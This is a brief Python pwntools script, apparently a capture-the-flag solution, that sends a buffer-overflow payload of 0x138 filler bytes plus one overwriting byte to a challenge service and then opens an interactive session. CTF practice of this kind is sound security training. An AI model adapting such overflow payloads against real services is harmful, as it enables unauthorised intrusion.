#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./j0n9hyun_secret")
p = remote("ctf.j0n9hyun.xyz", 3031)
p.sendlineafter("input name: ", 'A'*0x138 + p8(3))

p.interactive()
